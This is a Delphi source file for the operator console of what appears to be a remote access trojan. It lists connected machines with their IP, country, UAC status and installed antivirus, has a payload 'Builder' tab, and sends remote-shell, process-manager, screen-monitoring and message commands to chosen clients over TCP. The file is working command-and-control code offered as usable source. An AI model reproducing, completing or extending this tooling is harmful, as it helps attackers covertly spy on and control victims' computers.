unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages,
  System.SysUtils, System.Variants, System.Classes,
  System.JSON,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.ComCtrls, Vcl.StdCtrls, Vcl.Samples.Spin, Vcl.ExtCtrls, Vcl.Menus,
  ncSockets, ncLines,
  ServerManager,
  UnitSendMessage,
  UnitGetInformation,
  UnitProcessManager,
  UnitRemoteShell,
  UnitRemoteMonitoring,
  Vcl.WinXCtrls;

type
  TForm1 = class(TForm)
    PageControl1  : TPageControl;
    Clients       : TTabSheet;
    Settings      : TTabSheet;
    Builder       : TTabSheet;
    About         : TTabSheet;
    ListView1     : TListView;
    GroupBox1     : TGroupBox;
    SpinEdit1     : TSpinEdit;
    Button1       : TButton;
    StatusBar3    : TStatusBar;
    ncTCPServer1  : TncTCPServer;
    PopupMenu1    : TPopupMenu;
    SendMessage1  : TMenuItem;
    Information1  : TMenuItem;
    Logs          : TTabSheet;
    ListView2     : TListView;
    GroupBox2     : TGroupBox;
    ToggleSwitch1 : TToggleSwitch;
    ToggleSwitch2 : TToggleSwitch;
    ToggleSwitch3 : TToggleSwitch;
    PopupMenu2    : TPopupMenu;
    ClearLogs1    : TMenuItem;
    ProcessManager1  : TMenuItem;
    RemoteShell1     : TMenuItem;
    RemoteMonitoring1: TMenuItem;

    procedure Button1Click(Sender: TObject);
    procedure SendMessage1Click(Sender: TObject);
    procedure Information1Click(Sender: TObject);
    procedure ProcessManager1Click(Sender: TObject);
    procedure ListView1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormCreate(Sender: TObject);
    procedure ClearLogs1Click(Sender: TObject);
    procedure RemoteShell1Click(Sender: TObject);
    procedure RemoteMonitoring1Click(Sender: TObject);
  private
    FServerManager: TServerManager;
    FCurrentPort  : Integer;

    procedure OnClientConnected   (const Info: TClientInfo);
    procedure OnClientUpdated     (const Info: TClientInfo);
    procedure OnClientDisconnected(aLine: TncLine);
    procedure OnInfoReceived      (aLine: TncLine; JSONObj: TJSONObject);
    procedure OnProcessReceived   (aLine: TncLine; JSONObj: TJSONObject);
    procedure OnRemoteShellReceived(aLine: TncLine; JSONObj: TJSONObject);
    procedure OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
    procedure OnServerLog(Category: TLogCategory; const Msg: string);
    procedure AddLog(Category: TLogCategory; const Msg: string);
    procedure EnsureRemoteMonitoringMenuItem;
    function  IsRealClientValue(const Value: string): Boolean;
    function  PreferClientValue(const NewValue, CurrentValue: string): string;
    procedure AddOrUpdateListView(const Info: TClientInfo);
    procedure RemoveFromListView(aLine: TncLine);
    procedure UpdateStatusBar;
  public
    procedure AfterConstruction; override;
    procedure BeforeDestruction; override;
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.AfterConstruction;
begin
  inherited;
  FServerManager := TServerManager.Create(ncTCPServer1);
  FServerManager.OnClientConnected     := OnClientConnected;
  FServerManager.OnClientUpdated       := OnClientUpdated;
  FServerManager.OnClientDisconnected  := OnClientDisconnected;
  FServerManager.OnInfoReceived        := OnInfoReceived;
  FServerManager.OnProcessReceived     := OnProcessReceived;
  FServerManager.OnRemoteShellReceived := OnRemoteShellReceived;
  FServerManager.OnMonitoringReceived  := OnMonitoringReceived;
  FServerManager.OnLog                 := OnServerLog;

  if Assigned(ProcessManager1) then
    ProcessManager1.OnClick := ProcessManager1Click;
  if Assigned(RemoteShell1) then
    RemoteShell1.OnClick := RemoteShell1Click;
  EnsureRemoteMonitoringMenuItem;
  ListView1.OnMouseDown := ListView1MouseDown;
end;

procedure TForm1.BeforeDestruction;
begin
  FServerManager.Free;
  inherited;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  // Başlatma AfterConstruction'da yapılıyor
end;

// ---- Log Sistemi ----

procedure TForm1.OnServerLog(Category: TLogCategory; const Msg: string);
begin
  case Category of
    lcConnection: if ToggleSwitch1.State = tssOff then Exit;
    lcCommand   : if ToggleSwitch2.State = tssOff then Exit;
    lcError     : if ToggleSwitch3.State = tssOff then Exit;
  end;
  AddLog(Category, Msg);
end;

procedure TForm1.AddLog(Category: TLogCategory; const Msg: string);
var
  Item: TListItem;
begin
  ListView2.Items.BeginUpdate;
  try
    Item := ListView2.Items.Add;
    Item.Caption := FormatDateTime('hh:nn:ss', Now);
    Item.SubItems.Add(Msg);
    Item.MakeVisible(False);
  finally
    ListView2.Items.EndUpdate;
  end;
end;

procedure TForm1.ClearLogs1Click(Sender: TObject);
begin
  ListView2.Items.Clear;
end;

procedure TForm1.EnsureRemoteMonitoringMenuItem;
begin
  if not Assigned(PopupMenu1) then
    Exit;

  if not Assigned(RemoteMonitoring1) then
  begin
    RemoteMonitoring1         := TMenuItem.Create(PopupMenu1);
    RemoteMonitoring1.Caption := 'Remote Monitoring';
    PopupMenu1.Items.Add(RemoteMonitoring1);
  end;

  RemoteMonitoring1.OnClick := RemoteMonitoring1Click;
end;

// ---- Sunucu Başlatma ----

procedure TForm1.Button1Click(Sender: TObject);
var
  NewPort: Integer;
begin
  NewPort := SpinEdit1.Value;

  if not FServerManager.IsActive then
  begin
    FServerManager.Start(NewPort);
    FCurrentPort := NewPort;
    MessageBox(0, PChar('Server başlatıldı. Port: ' + IntToStr(NewPort)),
               'Info', MB_OK or MB_ICONINFORMATION);
    Exit;
  end;

  if NewPort = FCurrentPort then
  begin
    MessageBox(0, 'Bu port zaten dinleniyor.', 'Warning', MB_OK or MB_ICONWARNING);
    Exit;
  end;

  FServerManager.Stop;
  FServerManager.Start(NewPort);
  FCurrentPort := NewPort;
  MessageBox(0, PChar('Port değiştirildi. Yeni port: ' + IntToStr(NewPort)),
             'Info', MB_OK or MB_ICONINFORMATION);
end;

// ---- Popup Menü: Mesaj Gönder ----

procedure TForm1.SendMessage1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  JSONObj     : TJSONObject;
begin
  if ListView1.Selected = nil then Exit;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then Exit;

  Form2 := TForm2.Create(Self);
  try
    if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
      Form2.Label1.Caption := 'Target: ' + LInfo.ID;

    if Form2.ShowModal = mrOk then
    begin
      JSONObj := TJSONObject.Create;
      try
        JSONObj.AddPair('action', 'message');
        JSONObj.AddPair('title',  Form2.Edit1.Text);
        JSONObj.AddPair('text',   Form2.Memo1.Text);
        JSONObj.AddPair('type',   Form2.ComboBox1.Text);
        FServerManager.SendJSON(SelectedLine, JSONObj);
      finally
        JSONObj.Free;
      end;
    end;
  finally
    Form2.Free;
  end;
end;

// ---- Popup Menü: Bilgi Al ----

procedure TForm1.Information1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  JSONObj     : TJSONObject;
  F3          : TForm3;
begin
  if ListView1.Selected = nil then Exit;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then Exit;

  F3 := TForm3.Create(Application);

  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    F3.SetupForClient(SelectedLine, LInfo.ID)
  else
    F3.SetupForClient(SelectedLine, 'Unknown');

  FServerManager.RegisterInfoForm(SelectedLine, F3);
  F3.Show;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getinfo');
    FServerManager.SendJSON(SelectedLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

// ---- Popup Menü: Process Manager ----

procedure TForm1.ProcessManager1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F4          : TForm4;
begin
  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lutfen once bir client secin.', 'Process Manager',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Process Manager',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F4 := FServerManager.GetProcessForm(SelectedLine);
  if Assigned(F4) then
  begin
    F4.Show;
    F4.BringToFront;
    F4.RequestProcesses;
    Exit;
  end;

  F4 := TForm4.Create(Application);

  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    F4.SetupForClient(SelectedLine, LInfo.ID,
                      FServerManager.SendJSON,
                      FServerManager.UnregisterProcessForm)
  else
    F4.SetupForClient(SelectedLine, 'Unknown',
                      FServerManager.SendJSON,
                      FServerManager.UnregisterProcessForm);

  FServerManager.RegisterProcessForm(SelectedLine, F4);
  F4.Show;
  F4.RequestProcesses;
end;

procedure TForm1.ListView1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  Item: TListItem;
begin
  if Button <> mbRight then
    Exit;

  Item := ListView1.GetItemAt(X, Y);
  if Assigned(Item) then
    Item.Selected := True;
end;

{ --- ServerManager Callback'leri --- }

procedure TForm1.OnClientConnected(const Info: TClientInfo);
var
  LatestInfo: TClientInfo;
begin
  if FServerManager.TryGetClientInfo(Info.LineHandle, LatestInfo) then
    AddOrUpdateListView(LatestInfo)
  else
    AddOrUpdateListView(Info);
  UpdateStatusBar;
end;

procedure TForm1.OnClientUpdated(const Info: TClientInfo);
var
  LatestInfo: TClientInfo;
begin
  if FServerManager.TryGetClientInfo(Info.LineHandle, LatestInfo) then
    AddOrUpdateListView(LatestInfo)
  else
    AddOrUpdateListView(Info);
end;

procedure TForm1.OnClientDisconnected(aLine: TncLine);
begin
  RemoveFromListView(aLine);
  UpdateStatusBar;
  FServerManager.UnregisterInfoForm(aLine);
  FServerManager.UnregisterProcessForm(aLine);
  FServerManager.UnregisterRemoteShellForm(aLine);
  FServerManager.UnregisterMonitoringForm(aLine);
end;

procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F3: TForm3;
begin
  F3 := FServerManager.GetInfoForm(aLine);
  if Assigned(F3) then
    F3.HandleInfoJSON(JSONObj);
end;

procedure TForm1.OnProcessReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F4: TForm4;
begin
  F4 := FServerManager.GetProcessForm(aLine);
  if Assigned(F4) then
    F4.HandleProcessJSON(JSONObj);
end;

procedure TForm1.OnRemoteShellReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F5: TForm5;
begin
  F5 := FServerManager.GetRemoteShellForm(aLine);
  if Assigned(F5) then
    F5.HandleShellJSON(JSONObj);
end;

procedure TForm1.OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
var
  F6: TForm6;
begin
  F6 := FServerManager.GetMonitoringForm(aLine);
  if Assigned(F6) then
    F6.HandleMonitoringJSON(JSONObj);
end;

{ --- UI Yardımcı Metodlar --- }

function TForm1.IsRealClientValue(const Value: string): Boolean;
begin
  Result := (Trim(Value) <> '') and (Trim(Value) <> '...') and
            (not SameText(Trim(Value), 'N/A'));
end;

function TForm1.PreferClientValue(const NewValue, CurrentValue: string): string;
begin
  if IsRealClientValue(NewValue) then
    Result := NewValue
  else if IsRealClientValue(CurrentValue) then
    Result := CurrentValue
  else
    Result := NewValue;
end;

procedure TForm1.AddOrUpdateListView(const Info: TClientInfo);
var
  Item: TListItem;
  i   : Integer;
begin
  Item := nil;
  for i := 0 to ListView1.Items.Count - 1 do
    if TncLine(ListView1.Items[i].Data) = Info.LineHandle then
    begin
      Item := ListView1.Items[i];
      Break;
    end;

  if Item = nil then
  begin
    Item      := ListView1.Items.Add;
    Item.Data := Info.LineHandle;
    for i := 1 to 7 do Item.SubItems.Add('');
  end;

  Item.Caption     := PreferClientValue(Info.IPAddress,   Item.Caption);
  Item.SubItems[0] := PreferClientValue(Info.Country,     Item.SubItems[0]);
  Item.SubItems[1] := PreferClientValue(Info.ID,          Item.SubItems[1]);
  Item.SubItems[2] := PreferClientValue(Info.DesktopName, Item.SubItems[2]);
  Item.SubItems[3] := PreferClientValue(Info.OS,          Item.SubItems[3]);
  Item.SubItems[4] := PreferClientValue(Info.Date,        Item.SubItems[4]);
  Item.SubItems[5] := PreferClientValue(Info.UAC,         Item.SubItems[5]);
  Item.SubItems[6] := PreferClientValue(Info.AntiVirus,   Item.SubItems[6]);
end;

procedure TForm1.RemoteShell1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F5          : TForm5;
begin
  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lutfen once bir client secin.', 'Remote Shell',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Remote Shell',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F5 := FServerManager.GetRemoteShellForm(SelectedLine);
  if Assigned(F5) then
  begin
    F5.Show;
    F5.BringToFront;
    F5.RequestShellStart;
    Exit;
  end;

  F5 := TForm5.Create(Application);

  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    F5.SetupForClient(SelectedLine, LInfo.ID,
                      FServerManager.SendJSON,
                      FServerManager.UnregisterRemoteShellForm)
  else
    F5.SetupForClient(SelectedLine, 'Unknown',
                      FServerManager.SendJSON,
                      FServerManager.UnregisterRemoteShellForm);

  FServerManager.RegisterRemoteShellForm(SelectedLine, F5);
  F5.Show;
  F5.RequestShellStart;
end;

procedure TForm1.RemoteMonitoring1Click(Sender: TObject);
var
  SelectedLine: TncLine;
  LInfo       : TClientInfo;
  F6          : TForm6;
begin
  if ListView1.Selected = nil then
  begin
    MessageBox(Handle, 'Lutfen once bir client secin.', 'Remote Monitoring',
               MB_OK or MB_ICONWARNING);
    Exit;
  end;

  SelectedLine := TncLine(ListView1.Selected.Data);
  if SelectedLine = nil then
  begin
    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Remote Monitoring',
               MB_OK or MB_ICONERROR);
    Exit;
  end;

  F6 := FServerManager.GetMonitoringForm(SelectedLine);
  if Assigned(F6) then
  begin
    F6.Show;
    F6.BringToFront;
    Exit;
  end;

  F6 := TForm6.Create(Application);

  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
    F6.SetupForClient(SelectedLine, LInfo.ID,
                      FServerManager.SendJSON,
                      FServerManager.UnregisterMonitoringForm)
  else
    F6.SetupForClient(SelectedLine, 'Unknown',
                      FServerManager.SendJSON,
                      FServerManager.UnregisterMonitoringForm);

  FServerManager.RegisterMonitoringForm(SelectedLine, F6);
  F6.Show;
  F6.RequestMonitorList;
end;

procedure TForm1.RemoveFromListView(aLine: TncLine);
var
  i: Integer;
begin
  for i := ListView1.Items.Count - 1 downto 0 do
    if TncLine(ListView1.Items[i].Data) = aLine then
    begin
      ListView1.Items.Delete(i);
      Break;
    end;
end;

procedure TForm1.UpdateStatusBar;
begin
  StatusBar3.Panels[0].Text :=
    'Clients Online [' + IntToStr(FServerManager.ClientCount) + ']';
end;

end.
